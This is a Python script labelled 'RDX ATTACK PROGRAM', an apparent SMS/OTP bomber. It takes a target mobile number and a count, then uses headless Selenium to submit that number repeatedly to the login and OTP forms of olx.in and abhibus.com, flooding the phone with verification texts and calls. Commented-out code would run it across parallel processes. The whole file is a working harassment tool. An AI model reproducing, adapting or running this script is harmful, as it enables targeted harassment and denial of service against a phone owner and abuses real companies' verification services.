# --------------------------------------------------------  RDX ATTACK PROGRAM -----------------------------------
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
import  random
import os
import multiprocessing

# -------------------------     USING ARGUMENTS     ----------------------
import argparse
my_parser = argparse.ArgumentParser(description='give the mobile number and the sms number')
my_parser.add_argument('mn', metavar='mn',type=str, help='Mobile Number')
my_parser.add_argument('fq', metavar='fq',type=str, help='Numbers Of Sms')
args = my_parser.parse_args()

mn = args.mn
fq = args.fq

# --------------------         MAIN PROGRAM           -------------------------

# os.system("heroku run:detached python changeworker.py add rdxbomb -app rdxbomb")

options = Options()

options.binary_location = os.environ.get("GOOGLE_CHROME_BIN")

options.add_argument('--headless')

options.add_argument('--disable-dev-shm-usage')

options.add_argument('--no-sandbox')

# -------------------------------------------------------
# options.add_argument('--disable-gpu')


browser = webdriver.Chrome(executable_path=os.environ.get("CHROMEDRIVER_PATH"),options=options)
# browser = webdriver.Chrome()


def call_olx(num):
    try:
        browser.get('https://www.olx.in/')
        time.sleep(2)

        browser.find_element_by_xpath('//*[@id="container"]/header/div/div/div[4]/button/span').click()
        time.sleep(3)

        browser.find_element_by_xpath('/html/body/div[3]/div/div/div/button[1]/span').click()
        time.sleep(3)

        browser.find_element_by_xpath('//*[@id="phone"]').send_keys(num)
        time.sleep(2)

        browser.find_element_by_xpath('/html/body/div[3]/div/div/form/div/button').click()
        time.sleep(2)

        browser.find_element_by_xpath('/html/body/div[3]/div/div/form/div/div[4]/span/span').click()
        print(" olx send ")

        time.sleep(2)



    except:
        print("olx failed")


def call_abhibus(num):
    try:
        browser.get('https://www.abhibus.com/')
        time.sleep(2)

        browser.find_element_by_xpath('//*[@id="AccLogin"]').click()
        time.sleep(3)


        browser.find_element_by_xpath('//*[@id="mobileNo"]').send_keys(num)
        time.sleep(2)

        browser.find_element_by_xpath('//*[@id="getotp"]').click()

        time.sleep(30)

        browser.find_element_by_xpath('//*[@id="btngetoncall1"]').click()
        print(" abhibus send ")

        time.sleep(2)



    except:
        print("abhibus failed")

# -------------------------------------------------END FUNCTIONS ----------------------------------------------


funclist = [call_olx,call_abhibus]


for i in range(int(fq)+1):
    sf = random.choice(funclist)
    sf(mn)



# if __name__ == "__main__":
#     t1 = multiprocessing.Process(target=bomb)
#     t2 = multiprocessing.Process(target=bomb)
#     # t3 = multiprocessing.Process(target=bomb)
#     # t4 = multiprocessing.Process(target=bomb)
#     # t5 = multiprocessing.Process(target=bomb)
#     # t6 = multiprocessing.Process(target=bomb)
#     # t7 = multiprocessing.Process(target=bomb)
#     # t8 = multiprocessing.Process(target=bomb)

#     t1.start()
#     t2.start()
#     # t3.start()
#     # t4.start()
#     # t5.start()
#     # t6.start()
#     # t7.start()
#     # t8.start()

#     t1.join()
#     t2.join()





# ---------------------------------------------------------------END  SCRIPT -----------------------------------------------------------